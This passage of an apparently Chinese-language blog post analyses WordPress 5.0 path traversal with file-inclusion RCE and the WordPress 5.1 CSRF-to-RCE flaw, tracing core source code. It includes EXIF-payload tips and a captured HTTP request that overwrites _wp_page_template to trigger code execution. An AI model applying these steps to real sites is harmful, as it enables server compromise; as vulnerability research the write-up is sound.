class="keyword">if</span> ( ! call_user_func( <span class="keyword">array</span>( $implementation, <span class="string">'test'</span> ), $args ) )</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">isset</span>( $args[<span class="string">'mime_type'</span>] ) &amp;&amp;</span><br><span class="line">			! call_user_func(</span><br><span class="line">				<span class="keyword">array</span>( $implementation, <span class="string">'supports_mime_type'</span> ),</span><br><span class="line">				$args[<span class="string">'mime_type'</span>] ) ) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">isset</span>( $args[<span class="string">'methods'</span>] ) &amp;&amp;</span><br><span class="line">			 array_diff( $args[<span class="string">'methods'</span>], get_class_methods( $implementation ) ) ) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $implementation;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这里有个小tips：</p>
<blockquote>
<ul>
<li>Imagick不会去除掉图片中的exif部分，所以我们可以将待执行payload代码加入到exif部分。</li>
<li>GD会去除图片的exif部分，并且其中的phpcode很难存活。除非通过精心构造一张图片才可以。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;然后流程进入到第23行，调用 <strong>$editor-&gt;crop</strong> 剪裁图片，然后将图片名字命名为 <strong>cropped-xxx</strong> ,最后在38行，调用 <strong>\$editor-&gt;save</strong> 存储图片，所以这里通过裁剪，由于没有过滤<code>../</code>等字符，造成了目录跳转。<br>&emsp;&emsp;这里还有个小tips：</p>
<blockquote>
<p>而linux、mac支持这种假目录，可以使用?号</p>
<blockquote>
<p>但windows在路径中不能有?号，所以这里改用了#号</p>
</blockquote>
</blockquote>
<p><img src="http://l1nk3r.xmutsec.com/blog/noay9.png" alt=""></p>
<h4 id="3、文件包含"><a href="#3、文件包含" class="headerlink" title="3、文件包含"></a>3、文件包含</h4><p>&emsp;&emsp;由于RIPS文章里只提到 <strong>_wp_page_template</strong> ，因此我们可以在代码里面搜一下。<br><img src="http://l1nk3r.xmutsec.com/blog/zbezy.jpg" alt=""><br>&emsp;&emsp;发现在 <strong>get_page_template_slug</strong> 方法中调用了存在 <strong>_wp_page_template</strong> ，并且可根据 <strong>POST</strong> 传入的值通过调用 <strong>get_post_meta</strong> 获取 <strong>id</strong> ，并且根据传入的 <strong>id</strong> 查询相关 <strong>meta_key</strong> 值为 <strong>_wp_page_template</strong> 对应 <strong>meta_value</strong> 的值。并且最后返回 <strong>template</strong> 变量。<br><img src="http://l1nk3r.xmutsec.com/blog/l5gr3.png" alt=""><br>&emsp;&emsp;所以这里可以继续回溯，看看哪里调用了 <strong>get_page_template_slug</strong> 方法，下图中的 <strong>wp-includes/template.php</strong> 文件里的两个调用<strong>get_page_template_slug</strong> 的方法分别是 <strong>get_page_template</strong> 和 <strong>get_single_template</strong> 方法。<br><img src="http://l1nk3r.xmutsec.com/blog/3bgqs.jpg" alt=""><br>&emsp;&emsp;而在回溯 <strong>get_page_template</strong> 方法的时候暂时没有找到相关利用点，因此这里选择在 <strong>get_single_template</strong> 方法上嚼一下。首先在 <strong>wp-includes/template-loader.php</strong> 文件中，存在文件包含函数 <strong>include</strong> 。<br><img src="http://l1nk3r.xmutsec.com/blog/x1bxu.png" alt=""><br>而在 <strong>get_single_template</strong> 方法中，最后调用 <strong>get_query_template</strong> 处理 <strong>templates</strong> ,而 <strong>templates</strong> 是通过 <strong>get_page_template_slug</strong> 方法获取数据库中<strong>_wp_page_template</strong> 对应 <strong>meta_value</strong> 的值，这个值由前面可知可覆盖。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_single_template</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $object = get_queried_object();</span><br><span class="line">    $templates = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $object-&gt;post_type ) ) &#123;</span><br><span class="line">        $template = get_page_template_slug( $object );</span><br><span class="line">        <span class="keyword">if</span> ( $template &amp;&amp; <span class="number">0</span> === validate_file( $template ) ) &#123;</span><br><span class="line">            $templates[] = $template;</span><br><span class="line">            &#125;</span><br><span class="line">            $name_decoded = urldecode( $object-&gt;post_name );</span><br><span class="line">            <span class="keyword">if</span> ( $name_decoded !== $object-&gt;post_name ) &#123;</span><br><span class="line">                $templates[] = <span class="string">"single-&#123;$object-&gt;post_type&#125;-&#123;$name_decoded&#125;.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $templates[] = <span class="string">"single-&#123;$object-&gt;post_type&#125;-&#123;$object-&gt;post_name&#125;.php"</span>;</span><br><span class="line">        $templates[] = <span class="string">"single-&#123;$object-&gt;post_type&#125;.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $templates[] = <span class="string">"single.php"</span>;</span><br><span class="line">    <span class="keyword">return</span> get_query_template( <span class="string">'single'</span>, $templates );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;跟进 <strong>get_query_template</strong> 方法，该方法调用了 <strong>locate_template</strong> 方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_query_template</span><span class="params">( $type, $templates = array<span class="params">()</span> )</span> </span>&#123;</span><br><span class="line">	$type = preg_replace( <span class="string">'|[^a-z0-9-]+|'</span>, <span class="string">''</span>, $type );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">empty</span>( $templates ) )</span><br><span class="line">		$templates = <span class="keyword">array</span>(<span class="string">"&#123;$type&#125;.php"</span>);</span><br><span class="line">	$templates = apply_filters( <span class="string">"&#123;$type&#125;_template_hierarchy"</span>, $templates );</span><br><span class="line"></span><br><span class="line">	$template = locate_template( $templates );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> apply_filters( <span class="string">"&#123;$type&#125;_template"</span>, $template, $type, $templates );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;继续跟进 <strong>locate_template</strong> 方法，这里很明显路径采用拼接的方式，而 <strong>template_names</strong> 可控，所以这里就是一个利用点。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">locate_template</span><span class="params">($template_names, $load = false, $require_once = true )</span> </span>&#123;</span><br><span class="line">	$located = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ( (<span class="keyword">array</span>) $template_names <span class="keyword">as</span> $template_name ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( !$template_name )</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> ( file_exists(STYLESHEETPATH . <span class="string">'/'</span> . $template_name)) &#123;</span><br><span class="line">			$located = STYLESHEETPATH . <span class="string">'/'</span> . $template_name;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span> ( file_exists(TEMPLATEPATH . <span class="string">'/'</span> . $template_name) ) &#123;</span><br><span class="line">			$located = TEMPLATEPATH . <span class="string">'/'</span> . $template_name;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span> ( file_exists( ABSPATH . WPINC . <span class="string">'/theme-compat/'</span> . $template_name ) ) &#123;</span><br><span class="line">			$located = ABSPATH . WPINC . <span class="string">'/theme-compat/'</span> . $template_name;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( $load &amp;&amp; <span class="string">''</span> != $located )</span><br><span class="line">		load_template( $located, $require_once );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $located;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;复现一下，首先先上传一个txt文件，点击编辑详细信息。<br><img src="http://l1nk3r.xmutsec.com/blog/9bn77.jpg" alt=""><br>&emsp;&emsp;点击更新，通过bp抓包覆盖 <strong>_wp_page_template</strong> 对应的 <strong>meta_value</strong> 的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /wordpress/wp-admin/post.php HTTP/1.1</span><br><span class="line">Host: 192.168.97.69</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">_wpnonce=6a3ca9fed1...&amp;post_author_override=1&amp;meta_input[_wp_page_template]=cropped-demo.jpg</span><br></pre></td></tr></table></figure></p>
<p><img src="http://l1nk3r.xmutsec.com/blog/i7vl2.jpg" alt=""><br>&emsp;&emsp;然后再点击查看详情即可rce了。<br><img src="http://l1nk3r.xmutsec.com/blog/fbclk.png" alt=""></p>
<h3 id="二、WordPress-5-1-CSRF-to-Remote-Code-Execution"><a href="#二、WordPress-5-1-CSRF-to-Remote-Code-Execution" class="headerlink" title="二、WordPress 5.1 CSRF to Remote Code Execution"></a>二、WordPress 5.1 CSRF to Remote Code Execution</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>&emsp;&emsp;题目为CSRF-to-RCE起初我以为是一个很大的洞，后面看完发现其实就和我们普通的存储xss一样，通过XSS打后台cookie，因为wordpress超级管理员后台是允许管理员修改php文件。现在先来看看漏洞吧。根据下图payload，定位到相关漏洞点。<br><img src="http://l1nk3r.xmutsec.com/blog/19zne.png" alt=""><br>&emsp;&emsp;在此之前，我们看看非超级管理用户评论和超级管理员评论的数据包有什么区别，从数据包中可以看到，区别就在 <strong>_wp_unfiltered_html_comment</strong> 这个字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">匿名用户</span><br><span class="line">comment=aaa&amp;author=111&amp;email=11%40admin.com&amp;url=&amp;submit=%E5%8F%91%E8%A1%A8%E8%AF%84%E8%AE%BA&amp;comment_post_ID=1&amp;comment_parent=0</span><br><span class="line"></span><br><span class="line">超级管理员用户</span><br><span class="line">comment=aaa&amp;submit=%E5%8F%91%E8%A1%A8%E8%AF%84%E8%AE%BA&amp;comment_post_ID=1&amp;comment_parent=0&amp;_wp_unfiltered_html_comment=2eba52fd54</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;而根据rips文章中，漏洞点出现在wordpress/wp-includes/comment.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/comment.php</span></span><br><span class="line"><span class="keyword">if</span> ( current_user_can( <span class="string">'unfiltered_html'</span> ) ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">isset</span>( $comment_data[<span class="string">'_wp_unfiltered_html_comment'</span>] )</span><br><span class="line">    || ! wp_verify_nonce( $comment_data[<span class="string">'_wp_unfiltered_html_comment'</span>], <span class="string">'unfiltered-html-comment_'</span> . $comment_post_ID )</span><br><span class="line">			) &#123;</span><br><span class="line">            kses_remove_filters(); <span class="comment">// start with a clean slate</span></span><br><span class="line">            kses_init_filters(); <span class="comment">// set up the filters</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;如果创建该评论的是具备 <strong>unfiltered_html</strong> 功能的管理员，且 <strong>_wp_unfiltered_html_comment</strong> 不为空的情况，就会进入第二个if循环，并调用 <strong>kses_init_filters</strong> ，跟进这个方法，如果 <strong>current_user_can</strong> 判断成功就会使用 <strong>wp_filter_post_kses</strong> 方法处理，否则就会使用 <strong>wp_filter_kses</strong> 。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#kses_init_filters</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">kses_init_filters</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// Normal filtering</span></span><br><span class="line">	add_filter( <span class="string">'title_save_pre'</span>, <span class="string">'wp_filter_kses'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Comment filtering</span></span><br><span class="line">	<span class="keyword">if</span> ( current_user_can( <span class="string">'unfiltered_html'</span> ) ) &#123;</span><br><span class="line">		add_filter( <span class="string">'pre_comment_content'</span>, <span class="string">'wp_filter_post_kses'</span> );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		add_filter( <span class="string">'pre_comment_content'</span>, <span class="string">'wp_filter_kses'</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这里我们跟进一下 <strong>wp_filter_post_kses</strong> 方法，这个方法简单来说只是调用 <strong>addslashes</strong> 和 <strong>stripslashes</strong> 函数处理post提交的内容。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_filter_post_kses</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_filter_post_kses</span><span class="params">( $data )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> addslashes( wp_kses( stripslashes( $data ), <span class="string">'post'</span> ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;跟进一下 <strong>wp_filter_kses</strong> 方法，这个方法回多调用一个 <strong>current_filter</strong> 方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_filter_kses</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_filter_kses</span><span class="params">( $data )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> addslashes( wp_kses( stripslashes( $data ), current_filter() ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong>wp_filter_kses</strong> 和 <strong>wp_filter_post_kses</strong> 相同点在return的时候调用 <strong>wp_kses</strong> 方法进行处理，跟进 <strong>wp_kses</strong> 方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_kses</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_kses</span><span class="params">( $string, $allowed_html, $allowed_protocols = array<span class="params">()</span> )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">empty</span>( $allowed_protocols ) ) &#123;</span><br><span class="line">		$allowed_protocols = wp_allowed_protocols();</span><br><span class="line">	&#125;</span><br><span class="line">	$string = wp_kses_no_null( $string, <span class="keyword">array</span>( <span class="string">'slash_zero'</span> =&gt; <span class="string">'keep'</span> ) );</span><br><span class="line">	$string = wp_kses_normalize_entities( $string );</span><br><span class="line">	$string = wp_kses_hook( $string, $allowed_html, $allowed_protocols );</span><br><span class="line">	<span class="keyword">return</span> wp_kses_split( $string, $allowed_html, $allowed_protocols );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong>wp_kses</strong> 方法在return的时候调用了 <strong>wp_kses_split</strong> ，跟进一下这个方法。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//wordpress/wp-includes/kses.php#wp_kses_split</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">wp_kses_split</span><span class="params">( $string, $allowed_html, $allowed_protocols )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $pass_allowed_html, $pass_allowed_protocols;</span><br><span class="line">	$pass_allowed_html      = $allowed_html;</span><br><span class="line">	$pass_allowed_protocols = $allowed_protocols;</span><br><span class="line">	<span class="keyword">return</span> preg_replace_callback( <span class="string">'%(&lt;!--.*?(--&gt;|$))|(&lt;[^&gt;]*(&gt;|$)|&gt;)%'</span>, <span class="string">'_wp_kses_split_callback'</span>, $string );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个方法在 <strong>return</strong> 时候调用了 <strong>_wp_kses_split_callback</strong> ，继续跟进。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#_wp_kses_split_callback</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_kses_split_callback</span><span class="params">( $match )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $pass_allowed_html, $pass_allowed_protocols;</span><br><span class="line">	<span class="keyword">return</span> wp_kses_split2( $match[<span class="number">0</span>], $pass_allowed_html, $pass_allowed_protocols );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这里我们继续跟进一下 <strong>wp_kses_split2</strong> 方法，再返回的位置调用了 <strong>wp_kses_attr</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_kses_split2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_kses_split2</span><span class="params">( $string, $allowed_html, $allowed_protocols )</span> </span>&#123;</span><br><span class="line">    $string = wp_kses_stripslashes( $string );</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">return</span> wp_kses_attr( $elem, $attrlist, $allowed_html, $allowed_protocols );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;继续跟进 <strong>wp_kses_attr</strong> ，第三行调用了 <strong>wp_kses_allowed_html</strong> 方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_kses_attr</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_kses_attr</span><span class="params">( $element, $attr, $allowed_html, $allowed_protocols )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( ! is_array( $allowed_html ) ) &#123;</span><br><span class="line">		$allowed_html = wp_kses_allowed_html( $allowed_html );</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"&lt;$element$attr2$xhtml_slash&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;继续跟进 <strong>wp_kses_allowed_html</strong> ，简化了一下代码。<br><img src="http://l1nk3r.xmutsec.com/blog/i2mxr.png" alt=""><br>&emsp;&emsp;我们再回头看下 <strong>wp_filter_post_kses</strong> 和 <strong>wp_filter_kses</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_filter_kses</span></span><br><span class="line">wp_kses( stripslashes( $data ), <span class="string">'post'</span> ) </span><br><span class="line"></span><br><span class="line"><span class="comment">//wordpress/wp-includes/kses.php#wp_filter_kses</span></span><br><span class="line">wp_kses( stripslashes( $data ), current_filter())</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;也就是说在使用 <strong>wp_filter_kses</strong> 的情况下，默认是进入default中，而在default中存在一个 <strong>allowedtags</strong> 字段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/kses.php</span></span><br><span class="line">$allowedposttags = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'address'</span>    =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    <span class="string">'a'</span>          =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'href'</span>     =&gt; <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">'rel'</span>      =&gt; <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">'rev'</span>      =&gt; <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">'name'</span>     =&gt; <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">'target'</span>   =&gt; <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">'download'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'valueless'</span> =&gt; <span class="string">'y'</span>,</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">$allowedtags = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'a'</span>          =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'href'</span>  =&gt; <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">'title'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">        ),</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;而这里问题恰恰出现在了这个白名单上， <strong>wp_filter_post_kses</strong> 和 <strong>wp_filter_kses</strong> 差别在于 <strong>wp_filter_kses</strong> 方法更加的严格。<br>&emsp;&emsp;我们看到上面的白名单是允许a标签，当WordPress执行完评论的过滤过程后，就会修改评论字符串中的<code>&lt;a&gt;</code>标签，以适配SEO（搜索引擎优化）应用场景。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/default-filters.php:251</span></span><br><span class="line">add_filter( <span class="string">'pre_comment_content'</span>, <span class="string">'wp_rel_nofollow'</span>, <span class="number">15</span> );</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这里会调用 <strong>wp_rel_nofollow</strong> 来处理 <strong>pre_comment_content</strong> 内容，跟进 <strong>wp_rel_nofollow</strong> 调用了 <strong>wp_rel_nofollow_callback</strong> 进行处理text的内容。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/formatting.php#wp_rel_nofollow</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_rel_nofollow</span><span class="params">( $text )</span> </span>&#123;</span><br><span class="line">	<span class="comment">// This is a pre save filter, so text is already escaped.</span></span><br><span class="line">	$text = stripslashes( $text );</span><br><span class="line">	$text = preg_replace_callback( <span class="string">'|&lt;a (.+?)&gt;|i'</span>, <span class="string">'wp_rel_nofollow_callback'</span>, $text );</span><br><span class="line">	<span class="keyword">return</span> wp_slash( $text );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;跟进 <strong>wp_rel_nofollow_callback</strong> 方法，处理传入的<code>&lt;a&gt;</code>标签，如果<code>rel</code>位置的内容不为空，就会进入这个循环，然后通过 <strong>foreach</strong> 循环处理<code>&lt;a&gt;</code>的内容，并且进行拼接。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/formatting.php#wp_rel_nofollow_callback</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_rel_nofollow_callback</span><span class="params">( $matches )</span> </span>&#123;</span><br><span class="line">	$text = $matches[<span class="number">1</span>];</span><br><span class="line">	$atts = shortcode_parse_atts( $matches[<span class="number">1</span>] );</span><br><span class="line">	$rel  = <span class="string">'nofollow'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( preg_match( <span class="string">'%href=["\']('</span> . preg_quote( set_url_scheme( home_url(), <span class="string">'http'</span> ) ) . <span class="string">')%i'</span>, $text ) ||</span><br><span class="line">		preg_match( <span class="string">'%href=["\']('</span> . preg_quote( set_url_scheme( home_url(), <span class="string">'https'</span> ) ) . <span class="string">')%i'</span>, $text ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="string">"&lt;a $text&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $atts[<span class="string">'rel'</span>] ) ) &#123;</span><br><span class="line">		$parts = array_map( <span class="string">'trim'</span>, explode( <span class="string">' '</span>, $atts[<span class="string">'rel'</span>] ) );</span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">false</span> === array_search( <span class="string">'nofollow'</span>, $parts ) ) &#123;</span><br><span class="line">			$parts[] = <span class="string">'nofollow'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$rel = implode( <span class="string">' '</span>, $parts );</span><br><span class="line">		<span class="keyword">unset</span>( $atts[<span class="string">'rel'</span>] );</span><br><span class="line"></span><br><span class="line">		$html = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ( $atts <span class="keyword">as</span> $name =&gt; $value ) &#123;</span><br><span class="line">			$html .= <span class="string">"&#123;$name&#125;=\"$value\" "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$text = trim( $html );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"&lt;a $text rel=\"$rel\"&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
